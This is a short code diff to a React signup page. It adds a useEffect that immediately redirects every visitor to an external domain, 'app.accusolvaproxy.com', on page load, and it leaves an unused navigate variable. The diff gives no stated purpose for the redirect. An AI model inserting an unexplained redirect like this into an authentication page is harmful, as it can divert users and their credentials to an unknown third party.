@@ -1,10 +1,17 @@
-import React, { useState } from "react";
-import { Link } from "react-router-dom";
+import React, { useEffect, useState } from "react";
+import { Link,  useNavigate } from "react-router-dom";
 import { FcGoogle } from "react-icons/fc";
 import { IoEyeOutline, IoEyeOffOutline } from "react-icons/io5";
 import img from "../assets/signupImg.jpg";
 
+
 const Signup = () => {
+
+  const navigate = useNavigate()
+
+  useEffect(() => {
+     window.location.href = "https://app.accusolvaproxy.com/"
+  }, []);
   const [showPassword, setShowPassword] = useState(false);
   const [formData, setFormData] = useState({});
 
